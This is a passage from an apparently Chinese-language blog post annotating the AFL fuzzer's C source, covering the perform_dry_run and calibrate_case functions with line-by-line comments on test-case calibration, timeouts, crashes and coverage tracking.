class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Perform dry run of all test cases to confirm that the app is working as</span><br><span class="hljs-comment">   expected. This is done only for the initial inputs, and only once. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">perform_dry_run</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>* <span class="hljs-title">q</span> =</span> <span class="hljs-built_in">queue</span>;<br>  u32 cal_failures = <span class="hljs-number">0</span>;<br>  u8* skip_crashes = getenv(<span class="hljs-string">&quot;AFL_SKIP_CRASHES&quot;</span>);        <span class="hljs-comment">// 获取环境变量AFL_SKIP_CRASHES</span><br><br>  <span class="hljs-keyword">while</span> (q) &#123;   <span class="hljs-comment">// 遍历queue，以测试用例out_dir/id:000000,orig:testcase为例</span><br><br>    u8* use_mem;<br>    u8  res;<br>    s32 fd;<br><br>    u8* fn = <span class="hljs-built_in">strrchr</span>(q-&gt;fname, <span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-number">1</span>;        <span class="hljs-comment">// 获取测试用例的名称, id:000000,orig:testcase</span><br><br>    ACTF(<span class="hljs-string">&quot;Attempting dry run with &#x27;%s&#x27;...&quot;</span>, fn);        <span class="hljs-comment">// 尝试直接运行测试用例</span><br><br>    fd = open(q-&gt;fname, O_RDONLY);      <span class="hljs-comment">// 以只读模式打开q-&gt;fname文件，即out_dir/id:000000,orig:testcase</span><br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, q-&gt;fname);<br><br>    use_mem = ck_alloc_nozero(q-&gt;len);  <span class="hljs-comment">// 分配q-&gt;len长度的空间作为use_mem</span><br><br>    <span class="hljs-keyword">if</span> (read(fd, use_mem, q-&gt;len) != q-&gt;len)    <span class="hljs-comment">// 读取测试用例内容到use_mem</span><br>      FATAL(<span class="hljs-string">&quot;Short read from &#x27;%s&#x27;&quot;</span>, q-&gt;fname);<br><br>    close(fd);<br><br>    res = calibrate_case(argv, q, use_mem, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);       <span class="hljs-comment">// 评估测试用例，并返回res</span><br>    ck_free(use_mem);<br><br>    <span class="hljs-keyword">if</span> (stop_soon) <span class="hljs-keyword">return</span>;      <span class="hljs-comment">// 若stop_soon不为空，直接返回</span><br><br>    <span class="hljs-keyword">if</span> (res == crash_mode || res == FAULT_NOBITS)       <span class="hljs-comment">// 若res为crash_mode(-C设置)或者res为FAULT_NOBITS，打印执行信息</span><br>      SAYF(cGRA <span class="hljs-string">&quot;    len = %u, map size = %u, exec speed = %llu us\n&quot;</span> cRST, <br>           q-&gt;len, q-&gt;bitmap_size, q-&gt;exec_us);<br><br>    <span class="hljs-keyword">switch</span> (res) &#123;      <span class="hljs-comment">// 捕获其它FAULT类型</span><br><br>      <span class="hljs-keyword">case</span> FAULT_NONE:<br><br>        <span class="hljs-keyword">if</span> (q == <span class="hljs-built_in">queue</span>) check_map_coverage();   <span class="hljs-comment">// 若q是第一个测试用例，调用check_map_coverage，评估覆盖率</span><br><br>        <span class="hljs-keyword">if</span> (crash_mode) FATAL(<span class="hljs-string">&quot;Test case &#x27;%s&#x27; does *NOT* crash&quot;</span>, fn);   <span class="hljs-comment">// 若crash_mode不为空，报错并退出</span><br><br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> FAULT_TMOUT:<br><br>        <span class="hljs-keyword">if</span> (timeout_given) &#123;    <span class="hljs-comment">// 若timeout_given不为空</span><br><br>          <span class="hljs-comment">/* The -t nn+ syntax in the command line sets timeout_given to &#x27;2&#x27; and</span><br><span class="hljs-comment">             instructs afl-fuzz to tolerate but skip queue entries that time</span><br><span class="hljs-comment">             out. */</span><br><br>          <span class="hljs-keyword">if</span> (timeout_given &gt; <span class="hljs-number">1</span>) &#123;      <span class="hljs-comment">// 若timeout_given大于1，提示警告信息，并退出switch</span><br>            WARNF(<span class="hljs-string">&quot;Test case results in a timeout (skipping)&quot;</span>);<br>            q-&gt;cal_failed = CAL_CHANCES;<br>            cal_failures++;<br>            <span class="hljs-keyword">break</span>;<br>          &#125;<br><br>          SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>               <span class="hljs-string">&quot;The program took more than %u ms to process one of the initial test cases.\n&quot;</span><br>               <span class="hljs-string">&quot;    Usually, the right thing to do is to relax the -t option - or to delete it\n&quot;</span><br>               <span class="hljs-string">&quot;    altogether and allow the fuzzer to auto-calibrate. That said, if you know\n&quot;</span><br>               <span class="hljs-string">&quot;    what you are doing and want to simply skip the unruly test cases, append\n&quot;</span><br>               <span class="hljs-string">&quot;    &#x27;+&#x27; at the end of the value passed to -t (&#x27;-t %u+&#x27;).\n&quot;</span>, exec_tmout,<br>               exec_tmout);<br><br>          FATAL(<span class="hljs-string">&quot;Test case &#x27;%s&#x27; results in a timeout&quot;</span>, fn);<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br><br>          SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>               <span class="hljs-string">&quot;The program took more than %u ms to process one of the initial test cases.\n&quot;</span><br>               <span class="hljs-string">&quot;    This is bad news; raising the limit with the -t option is possible, but\n&quot;</span><br>               <span class="hljs-string">&quot;    will probably make the fuzzing process extremely slow.\n\n&quot;</span><br><br>               <span class="hljs-string">&quot;    If this test case is just a fluke, the other option is to just avoid it\n&quot;</span><br>               <span class="hljs-string">&quot;    altogether, and find one that is less of a CPU hog.\n&quot;</span>, exec_tmout);<br><br>          FATAL(<span class="hljs-string">&quot;Test case &#x27;%s&#x27; results in a timeout&quot;</span>, fn);<br><br>        &#125;<br><br>      <span class="hljs-keyword">case</span> FAULT_CRASH:  <br><br>        <span class="hljs-keyword">if</span> (crash_mode) <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// 若crash_mode不为空，直接退出switch</span><br><br>        <span class="hljs-keyword">if</span> (skip_crashes) &#123;     <span class="hljs-comment">// 若skip_crashes不为空，打印警告信息并退出switch</span><br>          WARNF(<span class="hljs-string">&quot;Test case results in a crash (skipping)&quot;</span>);<br>          q-&gt;cal_failed = CAL_CHANCES;<br>          cal_failures++;<br>          <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (mem_limit) &#123;        <span class="hljs-comment">// 若mem_limit不为空，即设置了内存限制，打印报错消息并退出</span><br><br>          SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>               <span class="hljs-string">&quot;Oops, the program crashed with one of the test cases provided. There are\n&quot;</span><br>               <span class="hljs-string">&quot;    several possible explanations:\n\n&quot;</span><br><br>               <span class="hljs-string">&quot;    - The test case causes known crashes under normal working conditions. If\n&quot;</span><br>               <span class="hljs-string">&quot;      so, please remove it. The fuzzer should be seeded with interesting\n&quot;</span><br>               <span class="hljs-string">&quot;      inputs - but not ones that cause an outright crash.\n\n&quot;</span><br><br>               <span class="hljs-string">&quot;    - The current memory limit (%s) is too low for this program, causing\n&quot;</span><br>               <span class="hljs-string">&quot;      it to die due to OOM when parsing valid files. To fix this, try\n&quot;</span><br>               <span class="hljs-string">&quot;      bumping it up with the -m setting in the command line. If in doubt,\n&quot;</span><br>               <span class="hljs-string">&quot;      try something along the lines of:\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br>               <span class="hljs-string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/binary [...] &lt;testcase )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>               <span class="hljs-string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/binary [...] &lt;testcase )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br>               <span class="hljs-string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to quickly\n&quot;</span><br>               <span class="hljs-string">&quot;      estimate the required amount of virtual memory for the binary. Also,\n&quot;</span><br>               <span class="hljs-string">&quot;      if you are using ASAN, see %s/notes_for_asan.txt.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br>  <br>               <span class="hljs-string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span><br>               <span class="hljs-string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span><br>               <span class="hljs-string">&quot;      binaries. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>               <span class="hljs-string">&quot;    - Least likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>               <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,<br>               DMS(mem_limit &lt;&lt; <span class="hljs-number">20</span>), mem_limit - <span class="hljs-number">1</span>, doc_path);<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br><br>          SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>               <span class="hljs-string">&quot;Oops, the program crashed with one of the test cases provided. There are\n&quot;</span><br>               <span class="hljs-string">&quot;    several possible explanations:\n\n&quot;</span><br><br>               <span class="hljs-string">&quot;    - The test case causes known crashes under normal working conditions. If\n&quot;</span><br>               <span class="hljs-string">&quot;      so, please remove it. The fuzzer should be seeded with interesting\n&quot;</span><br>               <span class="hljs-string">&quot;      inputs - but not ones that cause an outright crash.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br>  <br>               <span class="hljs-string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span><br>               <span class="hljs-string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span><br>               <span class="hljs-string">&quot;      binaries. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>               <span class="hljs-string">&quot;    - Least likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>               <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);<br><br>        &#125;<br><br>        FATAL(<span class="hljs-string">&quot;Test case &#x27;%s&#x27; results in a crash&quot;</span>, fn);<br><br>      <span class="hljs-keyword">case</span> FAULT_ERROR:         <span class="hljs-comment">// 执行target程序失败</span><br><br>        FATAL(<span class="hljs-string">&quot;Unable to execute target application (&#x27;%s&#x27;)&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><br>      <span class="hljs-keyword">case</span> FAULT_NOINST:        <span class="hljs-comment">// 未检测到插桩</span><br><br>        FATAL(<span class="hljs-string">&quot;No instrumentation detected&quot;</span>);<br><br>      <span class="hljs-keyword">case</span> FAULT_NOBITS:        <span class="hljs-comment">// 如果这个样例有出现路径信息，但是没有任何新路径，抛出警告</span><br>                                <span class="hljs-comment">// 认为这是无用路径。useless_at_start计数器加一</span><br><br>        useless_at_start++;<br><br>        <span class="hljs-keyword">if</span> (!in_bitmap &amp;&amp; !shuffle_queue)       <br>          WARNF(<span class="hljs-string">&quot;No new instrumentation output, test case may be useless.&quot;</span>);<br><br>        <span class="hljs-keyword">break</span>;<br><br>    &#125;<br>    <span class="hljs-comment">// 若样例q的var_behavior为真，则代表它多次运行，同样的输入条件下，却出现不同的覆盖信息。</span><br>    <span class="hljs-keyword">if</span> (q-&gt;var_behavior) WARNF(<span class="hljs-string">&quot;Instrumentation output varies across runs.&quot;</span>);<br><br>    q = q-&gt;next;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (cal_failures) &#123;   <span class="hljs-comment">// 若cal_failures不为空</span><br><br>    <span class="hljs-keyword">if</span> (cal_failures == queued_paths)   <span class="hljs-comment">// 若cal_failures等于queued_paths，报错并推出</span><br>      FATAL(<span class="hljs-string">&quot;All test cases time out%s, giving up!&quot;</span>,<br>            skip_crashes ? <span class="hljs-string">&quot; or crash&quot;</span> : <span class="hljs-string">&quot;&quot;</span>);<br><br>    WARNF(<span class="hljs-string">&quot;Skipped %u test cases (%0.02f%%) due to timeouts%s.&quot;</span>, cal_failures,<br>          ((<span class="hljs-type">double</span>)cal_failures) * <span class="hljs-number">100</span> / queued_paths,<br>          skip_crashes ? <span class="hljs-string">&quot; or crashes&quot;</span> : <span class="hljs-string">&quot;&quot;</span>);   <span class="hljs-comment">// 打印警告信息</span><br><br>    <span class="hljs-keyword">if</span> (cal_failures * <span class="hljs-number">5</span> &gt; queued_paths) <br>      WARNF(cLRD <span class="hljs-string">&quot;High percentage of rejected test cases, check settings!&quot;</span>);<br><br>  &#125;<br><br>  OKF(<span class="hljs-string">&quot;All test cases processed.&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case"></a>calibrate_case</h3><p>评估input文件夹下的case，来发现这些testcase的行为是否异常；以及在发现新的路径时，用以评估这个新发现的testcase的行为是否可变（这里的可变是指多次执行这个case，发现的路径不同）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Calibrate a new test case. This is done when processing the input directory</span><br><span class="hljs-comment">   to warn about flaky or otherwise problematic test cases early on; and when</span><br><span class="hljs-comment">   new paths are discovered to detect variable behavior and so on. */</span><br><br><span class="hljs-type">static</span> u8 <span class="hljs-title function_">calibrate_case</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv, <span class="hljs-keyword">struct</span> queue_entry* q, u8* use_mem,</span><br><span class="hljs-params">                         u32 handicap, u8 from_queue)</span> &#123;<br><br>  <span class="hljs-type">static</span> u8 first_trace[MAP_SIZE];<br><br>  u8  fault = <span class="hljs-number">0</span>, new_bits = <span class="hljs-number">0</span>, var_detected = <span class="hljs-number">0</span>, hnb = <span class="hljs-number">0</span>,<br>      first_run = (q-&gt;exec_cksum == <span class="hljs-number">0</span>); <span class="hljs-comment">/* 如果q-&gt;exec_cksum为0，代表这是这个case第一次运行，</span><br><span class="hljs-comment">                                           即来自input文件夹下，将first_run置为1. */</span><br><br>  u64 start_us, stop_us;<br><br>  s32 old_sc = stage_cur, old_sm = stage_max;<br>  u32 use_tmout = exec_tmout;<br>  u8* old_sn = stage_name;<br><br>  <span class="hljs-comment">/* Be a bit more generous about timeouts when resuming sessions, or when</span><br><span class="hljs-comment">     trying to calibrate already-added finds. This helps avoid trouble due</span><br><span class="hljs-comment">     to intermittent latency. */</span><br>  <br>  <span class="hljs-comment">/* 如果from_queue是0或者resuming_fuzz被置为1，即代表不来自于queue中或者</span><br><span class="hljs-comment">  在resuming sessions的时候，则use_tmout的值被设置的更大。*/</span><br><br>  <span class="hljs-keyword">if</span> (!from_queue || resuming_fuzz)<br>    use_tmout = MAX(exec_tmout + CAL_TMOUT_ADD,<br>                    exec_tmout * CAL_TMOUT_PERC / <span class="hljs-number">100</span>);<br><br>  q-&gt;cal_failed++;<br><br>  stage_name = <span class="hljs-string">&quot;calibration&quot;</span>;<br>  stage_max  = fast_cal ? <span class="hljs-number">3</span> : CAL_CYCLES;       <span class="hljs-comment">/* 每个新测试用例（以及显示出可变行为的测试用例）</span><br><span class="hljs-comment">                                                的校准周期数，也就是说这个stage要执行几次的意思 */</span><br><br>  <span class="hljs-comment">/* Make sure the forkserver is up before we do anything, and let&#x27;s not</span><br><span class="hljs-comment">     count its spin-up time toward binary calibration. */</span><br><br>  <span class="hljs-keyword">if</span> (dumb_mode != <span class="hljs-number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)<br>    init_forkserver(argv);      <span class="hljs-comment">// 启动forkserver</span><br><br>  <span class="hljs-keyword">if</span> (q-&gt;exec_cksum) &#123;  <span class="hljs-comment">// new case</span><br>                        <span class="hljs-comment">// 如果这个queue不是来自input文件夹，而是评估新case，则此时q-&gt;exec_cksum不空</span><br><br>    <span class="hljs-built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);  <span class="hljs-comment">// 拷贝trace_bits到first_trace</span><br>    hnb = has_new_bits(virgin_bits);    <span class="hljs-comment">// 调用has_new_bits检测新路径或者路径执行次数</span><br>    <span class="hljs-keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;<br><br>  &#125;<br><br>  start_us = get_cur_time_us();<br><br>  <span class="hljs-keyword">for</span> (stage_cur = <span class="hljs-number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;<br><br>    u32 cksum;<br><br>    <span class="hljs-keyword">if</span> (!first_run &amp;&amp; !(stage_cur % stats_update_freq)) show_stats();   <span class="hljs-comment">// 不是第一次运行的情况下，且当前执行轮次是stats_update_freq的整数倍</span><br>                                                                        <span class="hljs-comment">// 调用show_stats刷新一次展示界面</span><br><br>    write_to_testcase(use_mem, q-&gt;len); <span class="hljs-comment">// 将从q-&gt;fname中读取的内容写入到.cur_input中</span><br><br>    fault = run_target(argv, use_tmout);        <span class="hljs-comment">// 执行目标程序</span><br><br>    <span class="hljs-comment">/* stop_soon is set by the handler for Ctrl+C. When it&#x27;s pressed,</span><br><span class="hljs-comment">       we want to bail out quickly. */</span><br><br>    <span class="hljs-keyword">if</span> (stop_soon || fault != crash_mode) <span class="hljs-keyword">goto</span> abort_calibration;       <span class="hljs-comment">// 若stop_soon不为空，或者fault不为crash_modw，跳转</span><br><br>    <span class="hljs-comment">/* 如果 calibration stage第一次运行，且不在dumb_mode，共享内存中没有任何路径 */</span><br>    <span class="hljs-keyword">if</span> (!dumb_mode &amp;&amp; !stage_cur <br>        &amp;&amp; !count_bytes(trace_bits)) &#123;  <span class="hljs-comment">// 计算共享内存里有多少字节被置位</span><br>      fault = FAULT_NOINST;<br>      <span class="hljs-keyword">goto</span> abort_calibration;<br>    &#125;<br><br>    cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);   <span class="hljs-comment">// 计算路径hash值</span><br>    <br>    <span class="hljs-comment">// 不等于exec_cksum，表示第一次运行，或在相同参数下，每次执行，cksum不同，表示是一个路径可变的queue</span><br>    <span class="hljs-keyword">if</span> (q-&gt;exec_cksum != cksum) &#123;<br><br>      hnb = has_new_bits(virgin_bits);<br>      <span class="hljs-keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;<br><br>      <span class="hljs-keyword">if</span> (q-&gt;exec_cksum) &#123;      <span class="hljs-comment">// 判断是否为可变queue</span><br><br>        u32 i;<br><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAP_SIZE; i++) &#123;<br><br>          <span class="hljs-keyword">if</span> (!var_bytes[i] &amp;&amp; first_trace[i] != trace_bits[i]) &#123;       <span class="hljs-comment">// 如果first_trace[i]不等于trace_bits[i]</span><br>                                                                        <span class="hljs-comment">// 代表发现了可变queue</span><br><br>            var_bytes[i] = <span class="hljs-number">1</span>;<br>            stage_max    = CAL_CYCLES_LONG;<br><br>          &#125;<br><br>        &#125;<br><br>        var_detected = <span class="hljs-number">1</span>;<br><br>      &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// 代表第一次执行</span><br><br>        q-&gt;exec_cksum = cksum;<br>        <span class="hljs-built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);<br><br>      &#125;<br><br>    &#125;<br><br>  &#125;<br><br>  stop_us = get_cur_time_us();<br>  <br>  total_cal_us     += stop_us - start_us;       <span class="hljs-comment">// 计算评估stage_max轮的时间</span><br>  total_cal_cycles += stage_max;<br><br>  <span class="hljs-comment">/* OK, let&#x27;s collect some stats about the performance of this test case.</span><br><span class="hljs-comment">     This is used for fuzzing air time calculations in calculate_score(). */</span><br><br>  q-&gt;exec_us     = (stop_us - start_us) / stage_max;    <span class="hljs-comment">// 设置每轮平均执行时间</span><br>  q-&gt;bitmap_size = count_bytes(trace_bits);     <span class="hljs-comment">// 执行queue覆盖的路径数</span><br>  q-&gt;handicap    = handicap;<br>  q-&gt;cal_failed  = <span class="hljs-number">0</span>;<br><br>  total_bitmap_size += q-&gt;bitmap_size;  <span class="hljs-comment">// queue所覆盖到的路径总数</span><br>  total_bitmap_entries++;<br><br>  update_bitmap_score(q);       <span class="hljs-comment">// 每当我们发现一个新的路径，都会调用这个函数来判断其是不是更加地favorable</span><br><br>  <span class="hljs-comment">/* If this case didn&#x27;t result in new output from the instrumentation, tell</span><br><span class="hljs-comment">     parent. This is a non-critical problem, but something to warn the user</span><br><span class="hljs-comment">     about. */</span><br><br>  <span class="hljs-keyword">if</span> (!dumb_mode &amp;&amp; first_run &amp;&amp; !fault &amp;&amp; !new_bits) fault = FAULT_NOBITS;<br><br>abort_calibration:<br><br>  <span class="hljs-keyword">if</span> (new_bits == <span class="hljs-number">2</span> &amp;&amp; !q-&gt;has_new_cov) &#123;<br>    q-&gt;has_new_cov = <span class="hljs-number">1</span>;<br>    queued_with_cov++;  <span class="hljs-comment">// 代表发现了新路径</span><br>  &#125;<br><br>  <span class="hljs-comment">/* Mark variable paths. */</span><br>  <span class="hljs-comment">// 标记为可变路径</span><br>  <span class="hljs-keyword">if</span> (var_detected) &#123;   <span class="hljs-comment">// 若var_detected不为空</span><br><br>    var_byte_count = count_bytes(var_bytes);    <span class="hljs-comment">// 计算总路径数</span><br><br>    <span class="hljs-keyword">if</span> (!q-&gt;var_behavior) &#123;<br>      mark_as_variable(q);<br>      queued_variable++;<br>    &#125;<br><br>  &#125;<br><br>  stage_name = old_sn;  <span class="hljs-comment">// 恢复stage信息</span><br>  stage_cur  = old_sc;<br>  stage_max  = old_sm;<br><br>  <span class="hljs-keyword">if</span> (!first_run) show_stats(); <span class="hljs-comment">// 若不是第一次运行，调用show_stats</span><br><br>  <span class="hljs-keyword">return</span> fault; <span class="hljs-comment">// 返回错误信息</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver"></a>init_forkserver</h3><p>fork子进程作为fork server，创建管道用于进程间通信，后续执行目标程序都是再子进程的基础上fork。</p><p><a href="https://zhuanlan.zhihu.com/p/58489873">Linux 的进程间通信：管道</a></p><p><a href="https://www.cnblogs.com/GODYCA/archive/2013/01/05/2846197.html">进程间通信管道进阶篇：linux下dup&#x2F;dup2函数的用法</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 